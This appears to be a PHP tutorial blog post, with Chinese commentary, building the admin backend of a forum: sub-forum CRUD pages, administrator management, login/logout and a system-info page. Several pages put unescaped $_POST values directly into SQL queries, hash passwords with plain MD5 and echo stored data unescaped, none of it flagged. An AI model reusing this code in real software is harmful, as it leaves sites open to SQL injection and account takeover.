&lt;input class=&quot;common-input sort-input&quot; name=&quot;ord[]&quot; value=&quot;{$data[&#39;sort&#39;]}&quot; type=&quot;text&quot;&gt; &lt;/td&gt; &lt;td&gt;{$data[&#39;id&#39;]}&lt;/td&gt; &lt;td&gt;{$data[&#39;module_name&#39;]}&lt;/td&gt; &lt;td&gt;{$data[&#39;father_module_name&#39;]}&lt;/td&gt; &lt;td&gt;{$data[&#39;member_id&#39;]}&lt;/td&gt; &lt;td&gt; &lt;a class=&quot;link-update&quot; href=&quot;#&quot;&gt;[访问]&lt;/a&gt; &lt;a class=&quot;link-update&quot; href=&quot;son_module_update.php?id={$data[&#39;id&#39;]}&quot;&gt;[修改]&lt;/a&gt; &lt;a class=&quot;link-del&quot; href=&quot;$delete_url&quot;&gt;[删除]&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; A; echo $html; } ?&gt; &lt;/table&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--/main--&gt; &lt;/div&gt; &lt;?php include_once &#39;inc/footer.inc.php&#39;;//footer ?&gt; 2.son_module_delete.php &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; if(!isset($_GET[&#39;id&#39;]) || !is_numeric($_GET[&#39;id&#39;])){ skip(&#39;son_module.php&#39;,&#39;onError.gif&#39;,&#39;id参数错误！&#39;); } $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;; $query=&quot;delete from son_module where id={$_GET[&#39;id&#39;]}&quot;; execute($link,$query); if(mysqli_affected_rows($link)==1){ skip(&#39;son_module.php&#39;,&#39;onCorrect.gif&#39;,&#39;恭喜你删除成功！&#39;); }else{ skip(&#39;son_module.php&#39;,&#39;onError.gif&#39;,&#39;对不起删除失败，请重试！&#39;); } ?&gt; 3.son_module_update.php &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; $template[&#39;title&#39;]=&#39;子版块修改页&#39;; $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;; if(!isset($_GET[&#39;id&#39;]) || !is_numeric($_GET[&#39;id&#39;])){ skip(&#39;son_module.php&#39;,&#39;onError.gif&#39;,&#39;id参数错误！&#39;); } $query=&quot;select * from son_module where id={$_GET[&#39;id&#39;]}&quot;; $result=execute($link,$query); if(!mysqli_num_rows($result)){ skip(&#39;son_module.php&#39;,&#39;onError.gif&#39;,&#39;这条子版块信息不存在！&#39;); } $data=mysqli_fetch_assoc($result); if(isset($_POST[&#39;submit&#39;])){ //验证 $check_flag=&#39;update&#39;; include &#39;inc/check_son_module.inc.php&#39;; $query=&quot;update son_module set father_module_id={$_POST[&#39;father_module_id&#39;]},module_name=&#39;{$_POST[&#39;module_name&#39;]}&#39;,info=&#39;{$_POST[&#39;info&#39;]}&#39;,member_id={$_POST[&#39;member_id&#39;]},sort={$_POST[&#39;sort&#39;]} where id={$_GET[&#39;id&#39;]}&quot;; execute($link,$query); if(mysqli_affected_rows($link)==1){ skip(&#39;son_module.php&#39;,&#39;onCorrect.gif&#39;,&#39;修改成功！&#39;); }else{ skip(&#39;son_module.php&#39;,&#39;onError.gif&#39;,&#39;修改失败,请重试！&#39;); } } ?&gt; &lt;?php include_once &#39;inc/header.inc.php&#39;;//top include_once &#39;inc/sidebar.inc.php&#39;;//sidebar ?&gt; &lt;div class=&quot;main-wrap&quot;&gt; &lt;div class=&quot;crumb-wrap&quot;&gt; &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;father_module.php&quot;&gt;父板块列表&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;添加子版块&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;form method=&quot;post&quot;&gt; &lt;div class=&quot;result-content&quot;&gt; &lt;table class=&quot;result-tab&quot; width=&quot;80%&quot;&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;所属父版块&lt;/td&gt; &lt;td&gt; &lt;select name=&quot;father_module_id&quot;&gt; &lt;option value=&quot;0&quot;&gt;===请选择一个父版块===&lt;/option&gt; &lt;?php $query=&quot;select*from father_module&quot;; $result_father=execute($link,$query); while ($data_father=mysqli_fetch_assoc($result_father)){ if($data[&#39;father_module_id&#39;]==$data_father[&#39;Id&#39;]){ echo &quot;&lt;option value=&#39;{$data_father[&#39;Id&#39;]}&#39; selected=&#39;selected&#39;&gt;{$data_father[&#39;module_name&#39;]}&lt;/option&gt;&quot;; }else{ echo &quot;&lt;option value=&#39;{$data_father[&#39;Id&#39;]}&#39;&gt;{$data_father[&#39;module_name&#39;]}&lt;/option&gt;&quot;; } } ?&gt; &lt;/select&gt; &lt;/td&gt; &lt;td&gt;*请选择一个父版块&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;版块名称&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;module_name&quot; value=&quot;&lt;?php echo $data[&#39;module_name&#39;]?&gt;&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过40个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;版块简介&lt;/td&gt; &lt;td&gt; &lt;textarea name=&quot;info&quot; id=&quot;txtCon&quot; rows=&quot;6&quot; cols=&quot;50&quot;&gt;&lt;?php echo $data[&#39;info&#39;]?&gt;&lt;/textarea&gt; &lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过300个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;版主&lt;/td&gt; &lt;td&gt; &lt;select name=&quot;member_id&quot;&gt; &lt;option value=&quot;0&quot;&gt;===请选择一个会员作为版主===&lt;/option&gt; &lt;/select&gt; &lt;/td&gt; &lt;td&gt;可以选择一个会员作为版主&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;排序&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sort&quot; class=&quot;common-text&quot; value=&quot;&lt;?php echo $data[&#39;sort&#39;]?&gt;&quot;/&gt;&lt;/td&gt; &lt;td&gt;填入一个数字即可&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;br /&gt; &lt;input class=&quot;btn btn-primary btn6 mr10&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;修改&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php include &#39;inc/footer.inc.php&#39;?&gt; 同样，在子版块中，只有子版块列表是不够的。所以，也要实现子版块的添加。其中应该选择一个所属父版块，用&lt;option&gt;标签实现列出所有父版块的名字。 4.son_module_add.php &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; $template[&#39;title&#39;]=&#39;子版块添加页&#39;; $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;; if(isset($_POST[&#39;submit&#39;])){ //验证用户填写的信息 $check_flag=&#39;add&#39;; include &#39;inc/check_son_module.inc.php&#39;; $query=&quot;insert into son_module(father_module_id,module_name,info,member_id,sort) values({$_POST[&#39;father_module_id&#39;]},&#39;{$_POST[&#39;module_name&#39;]}&#39;,&#39;{$_POST[&#39;info&#39;]}&#39;,{$_POST[&#39;member_id&#39;]},{$_POST[&#39;sort&#39;]})&quot;; execute($link,$query); if(mysqli_affected_rows($link)==1){ skip(&#39;son_module.php&#39;,&#39;onCorrect.gif&#39;,&#39;恭喜你，添加成功！&#39;); }else{ skip(&#39;son_module_add.php&#39;,&#39;onError.gif&#39;,&#39;对不起，添加失败，请重试！&#39;); } } ?&gt; &lt;?php include_once &#39;inc/header.inc.php&#39;;//top include_once &#39;inc/sidebar.inc.php&#39;;//sidebar ?&gt; &lt;div class=&quot;main-wrap&quot;&gt; &lt;div class=&quot;crumb-wrap&quot;&gt; &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;father_module.php&quot;&gt;父板块列表&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;添加子版块&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;form method=&quot;post&quot;&gt; &lt;div class=&quot;result-content&quot;&gt; &lt;table class=&quot;result-tab&quot; width=&quot;80%&quot;&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;所属父版块&lt;/td&gt; &lt;td&gt; &lt;select name=&quot;father_module_id&quot;&gt; &lt;option value=&quot;0&quot;&gt;===请选择一个父版块===&lt;/option&gt; &lt;?php $query=&quot;select*from father_module&quot;; $result_father=execute($link,$query); while($data_father=mysqli_fetch_assoc($result_father)){ echo &quot;&lt;option value=&#39;{$data_father[&#39;Id&#39;]}&#39;&gt;{$data_father[&#39;module_name&#39;]}&lt;/option&gt;&quot;; } ?&gt; &lt;/select&gt; &lt;/td&gt; &lt;td&gt;*请选择一个父版块&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;版块名称&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;module_name&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过40个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;版块简介&lt;/td&gt; &lt;td&gt; &lt;textarea name=&quot;info&quot; id=&quot;txtCon&quot; rows=&quot;6&quot; cols=&quot;50&quot;&gt;&lt;/textarea&gt; &lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过300个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;版主&lt;/td&gt; &lt;td&gt; &lt;select name=&quot;member_id&quot;&gt; &lt;option value=&quot;0&quot;&gt;===请选择一个会员作为版主===&lt;/option&gt; &lt;/select&gt; &lt;/td&gt; &lt;td&gt;可以选择一个会员作为版主&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;排序&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sort&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt; &lt;td&gt;填入一个数字即可&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;br /&gt; &lt;input class=&quot;btn btn-primary btn6 mr10&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;添加&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php include &#39;inc/footer.inc.php&#39;?&gt; 四、后台-管理员管理员列表 除操作数据表外，大致和父版块类似。要注意的是，管理员有超级管理员和普通管理员，超级管理员可以添加删除管理员，普通管理员不具有管理管理员操作权限。 1.manage.php &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;; $template[&#39;title&#39;]=&#39;管理员列表页&#39;; ?&gt; &lt;?php include_once &#39;inc/header.inc.php&#39;;//top include_once &#39;inc/sidebar.inc.php&#39;;//sidebar ?&gt; &lt;div class=&quot;main-wrap&quot;&gt; &lt;div class=&quot;crumb-wrap&quot;&gt; &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;index.php&quot;&gt;后台首页&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;管理员列表&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;result-wrap&quot;&gt; &lt;form name=&quot;myform&quot; id=&quot;myform&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;result-title&quot;&gt; &lt;div class=&quot;result-list&quot;&gt; &lt;a href=&quot;manage_add.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;新增管理员&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;result-content&quot;&gt; &lt;table class=&quot;result-tab&quot; width=&quot;100%&quot;&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;5%&quot;&gt;&lt;input class=&quot;allChoose&quot; name=&quot;&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;th&gt;ID&lt;/th&gt; &lt;th&gt;名称&lt;/th&gt; &lt;th&gt;等级&lt;/th&gt; &lt;th&gt;创建日期&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;?php $query=&quot;select*from manage&quot;; $result=execute($link,$query); while ($data=mysqli_fetch_assoc($result)){ if($data[&#39;level&#39;]==0){ $data[&#39;level&#39;]=&#39;超级管理员&#39;; }else{ $data[&#39;level&#39;]=&#39;普通管理员&#39;; } $url=urlencode(&quot;manage_delete.php?id={$data[&#39;Id&#39;]}&quot;); $return_url=urlencode($_SERVER[&#39;REQUEST_URI&#39;]); $message=&quot;你真的要删除管理员 {$data[&#39;username&#39;]} 吗？&quot;; $delete_url=&quot;confirm.php?url={$url}&amp;return_url={$return_url}&amp;message={$message}&quot;; $html=&lt;&lt;&lt;A &lt;tr&gt; &lt;td class=&quot;tc&quot;&gt;&lt;input name=&quot;id[]&quot; value=&quot;59&quot; type=&quot;checkbox&quot;&gt;&lt;/td&gt; &lt;td&gt;{$data[&#39;Id&#39;]}&lt;/td&gt; &lt;td&gt;{$data[&#39;username&#39;]}&lt;/td&gt; &lt;td&gt;{$data[&#39;level&#39;]}&lt;/td&gt; &lt;td&gt;{$data[&#39;create_time&#39;]}&lt;/td&gt; &lt;td&gt;&lt;a href=&quot;{$delete_url}&quot;&gt;[删除]&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; A; echo $html; } ?&gt; &lt;/table&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--/main--&gt; &lt;/div&gt; &lt;?php include_once &#39;inc/footer.inc.php&#39;;//footer?&gt; 2.manage_delete.php &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; if(!isset($_GET[&#39;id&#39;]) || !is_numeric($_GET[&#39;id&#39;])){ skip(&#39;manage.php&#39;,&#39;onError.gif&#39;,&#39;id参数错误！&#39;); } $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;; $query=&quot;delete from manage where id={$_GET[&#39;id&#39;]}&quot;; execute($link,$query); if(mysqli_affected_rows($link)==1){ skip(&#39;manage.php&#39;,&#39;onCorrect.gif&#39;,&#39;恭喜你删除成功！&#39;); }else{ skip(&#39;manage.php&#39;,&#39;onError.gif&#39;,&#39;对不起删除失败，请重试！&#39;); } ?&gt; 3.manage_add.php &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;; if(isset($_POST[&#39;submit&#39;])){ $link=connect(); include &#39;inc/check_manage.inc.php&#39;; $query=&quot;insert into manage(username,password,create_time,level) values(&#39;{$_POST[&#39;username&#39;]}&#39;,md5({$_POST[&#39;password&#39;]}),now(),{$_POST[&#39;level&#39;]})&quot;; execute($link,$query); if(mysqli_affected_rows($link)==1){ skip(&#39;manage.php&#39;,&#39;onCorrect.gif&#39;,&#39;恭喜你，添加成功！&#39;); }else{ skip(&#39;manage.php&#39;,&#39;onError.gif&#39;,&#39;对不起，添加失败，请重试！&#39;); } } $template[&#39;title&#39;]=&#39;管理员添加页&#39;; ?&gt; &lt;?php include_once &#39;inc/header.inc.php&#39;;//top include_once &#39;inc/sidebar.inc.php&#39;;//sidebar ?&gt; &lt;div class=&quot;main-wrap&quot;&gt; &lt;div class=&quot;crumb-wrap&quot;&gt; &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;manage.php&quot;&gt;管理员列表&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;添加管理员&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;form method=&quot;post&quot;&gt; &lt;div class=&quot;result-content&quot;&gt; &lt;table class=&quot;result-tab&quot; width=&quot;70%&quot;&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; name=&quot;&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;管理员名称&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过32个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;密码&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;password&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt; &lt;td&gt;不能少于6位&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt; &lt;td&gt;等级&lt;/td&gt; &lt;td&gt; &lt;select name=&quot;level&quot;&gt; &lt;option value=&quot;1&quot;&gt;普通管理员&lt;/option&gt; &lt;option value=&quot;0&quot;&gt;超级管理员&lt;/option&gt; &lt;/select&gt; &lt;/td&gt; &lt;td&gt;请选择管理员等级,默认为普通管理员(不具备后台管理员管理权限)&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;br /&gt; &lt;input class=&quot;btn btn-primary btn6 mr10&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;添加&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php include_once &#39;inc/footer.inc.php&#39;;//footer?&gt; 4.管理员登录login.php &lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;); include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; $link=connect(); if(is_manage_login($link)){ skip(&#39;index.php&#39;,&#39;onCorrect.gif&#39;,&#39;您已经登录，请不要重复登录！&#39;); } if(isset($_POST[&#39;submit&#39;])){ include_once &#39;inc/check_login.inc.php&#39;; $_POST=escape($link,$_POST); $query=&quot;select * from manage where username=&#39;{$_POST[&#39;username&#39;]}&#39; and password=md5(&#39;{$_POST[&#39;password&#39;]}&#39;)&quot;; $result=execute($link, $query); if(mysqli_num_rows($result)==1){ $data=mysqli_fetch_assoc($result); $_SESSION[&#39;manage&#39;][&#39;username&#39;]=$data[&#39;username&#39;]; $_SESSION[&#39;manage&#39;][&#39;password&#39;]=sha1($data[&#39;password&#39;]); $_SESSION[&#39;manage&#39;][&#39;id&#39;]=$data[&#39;Id&#39;]; $_SESSION[&#39;manage&#39;][&#39;level&#39;]=$data[&#39;level&#39;]; skip(&#39;index.php&#39;,&#39;onCorrect.gif&#39;,&#39;登录成功！&#39;); }else{ skip(&#39;login.php&#39;,&#39;onError.gif&#39;,&#39;用户名或者密码错误，请重试！&#39;); } } ?&gt; &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;后台管理登录&lt;/title&gt; &lt;link href=&quot;css/admin_login.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;admin_login_wrap&quot;&gt; &lt;h1&gt;后台管理登录&lt;/h1&gt; &lt;div class=&quot;adming_login_border&quot;&gt; &lt;div class=&quot;admin_input&quot;&gt; &lt;form method=&quot;post&quot;&gt; &lt;ul class=&quot;admin_items&quot;&gt; &lt;li&gt; &lt;label for=&quot;username&quot;&gt;用户名：&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; size=&quot;40&quot; class=&quot;admin_input_style&quot; /&gt; &lt;/li&gt; &lt;li&gt; &lt;label for=&quot;password&quot;&gt;密 码：&lt;/label&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; size=&quot;40&quot; class=&quot;admin_input_style&quot; /&gt; &lt;/li&gt; &lt;li&gt; &lt;label for=&quot;vcode&quot;&gt;验证码:&lt;/label&gt; &lt;input name=&quot;vcode&quot; type=&quot;text&quot; size=&quot;40&quot; class=&quot;admin_input_style&quot; /&gt; &lt;a href=&quot;login.php&quot;&gt;&lt;img class=&quot;vcode&quot; src=&quot;../show_code.php&quot; /&gt;&lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; tabindex=&quot;3&quot; value=&quot;提交&quot; class=&quot;btn btn-primary&quot; /&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;p class=&quot;admin_copyright&quot;&gt;&lt;a tabindex=&quot;5&quot; href=&quot;index.php&quot; target=&quot;_blank&quot;&gt;返回首页&lt;/a&gt; &amp;copy; 2019 Powered by &lt;a href=&quot;http://qwzf.github.io&quot; target=&quot;_blank&quot;&gt;Q子枫&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 5.管理员注销logout.php &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; $link=connect(); if(!is_manage_login($link)){ header(&#39;Location:login.php&#39;); } else{ session_unset();//Free all session variables session_destroy();//销毁一个会话中的全部数据 setcookie(session_name(),&#39;&#39;,time()-3600,&#39;/&#39;);//销毁保存在客户端的卡号（session id） header(&#39;Location:login.php&#39;); } ?&gt; 五、后台-系统1.系统信息index.php 要实现上述系统信息的显示，一些sql查询计数语句足矣！！ &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;; $query=&quot;select * from manage where id={$_SESSION[&#39;manage&#39;][&#39;id&#39;]}&quot;; $result_manage=execute($link, $query); $data_manage=mysqli_fetch_assoc($result_manage); $query=&quot;select count(*) from father_module&quot;; $count_father_module=num($link,$query); $query=&quot;select count(*) from son_module&quot;; $count_son_module=num($link,$query); $query=&quot;select count(*) from content&quot;; $count_content=num($link,$query); $query=&quot;select count(*) from reply&quot;; $count_reply=num($link,$query); $query=&quot;select count(*) from member&quot;; $count_member=num($link,$query); $query=&quot;select count(*) from manage&quot;; $count_manage=num($link,$query); if($data_manage[&#39;level&#39;]==&#39;0&#39;){ $data_manage[&#39;level&#39;]=&#39;超级管理员&#39;; }else{ $data_manage[&#39;level&#39;]=&#39;普通管理员&#39;; } $template[&#39;title&#39;]=&#39;系统信息&#39;; ?&gt; &lt;?php include_once &#39;inc/header.inc.php&#39;;//top include_once &#39;inc/sidebar.inc.php&#39;;//sidebar ?&gt; &lt;div class=&quot;main-wrap&quot;&gt; &lt;div class=&quot;crumb-wrap&quot;&gt; &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe06b;&lt;/i&gt;&lt;span&gt;欢迎管理员&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;result-wrap&quot;&gt; &lt;div class=&quot;result-title&quot;&gt; &lt;h1&gt;系统基本信息&lt;/h1&gt; &lt;/div&gt; &lt;div class=&quot;result-content&quot;&gt; &lt;ul class=&quot;sys-info-list&quot;&gt; &lt;li&gt; &lt;label class=&quot;res-lab&quot;&gt;您好: &lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo $data_manage[&#39;username&#39;]?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=&quot;res-lab&quot;&gt;所属角色：&lt;/label&gt;&lt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo $data_manage[&#39;level&#39;]?&gt; &lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=&quot;res-lab&quot;&gt;创建时间：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo $data_manage[&#39;create_time&#39;]?&gt;&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;br /&gt; &lt;div class=&quot;result-content&quot;&gt; &lt;ul&gt; &lt;li&gt; &lt;span class=&quot;res-info&quot;&gt; 父版块(&lt;?php echo $count_father_module?&gt;) 子版块(&lt;?php echo $count_son_module?&gt;) 帖子(&lt;?php echo $count_content?&gt;) 回复(&lt;?php echo $count_reply?&gt;) 会员(&lt;?php echo $count_member?&gt;) 管理员(&lt;?php echo $count_manage?&gt;) &lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;br /&gt; &lt;div class=&quot;result-content&quot;&gt; &lt;ul&gt; &lt;li&gt; &lt;label class=&quot;res-lab&quot;&gt;服务器操作系统：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo PHP_OS?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=&quot;res-lab&quot;&gt;服务器软件：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo $_SERVER[&#39;SERVER_SOFTWARE&#39;]?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=&quot;res-lab&quot;&gt;MySQL 版本：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo mysqli_get_server_info($link)?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=&quot;res-lab&quot;&gt;最大上传文件：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo ini_get(&#39;upload_max_filesize&#39;)?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=&quot;res-lab&quot;&gt;内存限制：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo ini_get(&#39;memory_limit&#39;)?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;span class=&quot;res-info&quot;&gt;&lt;a target=&quot;_blank&quot; href=&quot;phpinfo.php&quot;&gt;PHP 配置信息&lt;/a&gt;&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;br /&gt; &lt;div class=&quot;result-content&quot;&gt; &lt;ul&gt; &lt;li&gt; &lt;label class=&quot;res-lab&quot;&gt;程序安装位置(绝对路径)：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo SA_PATH?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=&quot;res-lab&quot;&gt;程序在web根目录下的位置(首页的url地址)：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo SUB_URL?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=&quot;res-lab&quot;&gt;程序版本：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;Qwzf V1.0 &lt;a target=&quot;_blank&quot; href=&quot;#&quot;&gt;[查看最新版本]&lt;/a&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=&quot;res-lab&quot;&gt;程序作者：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;Qwzf &lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; 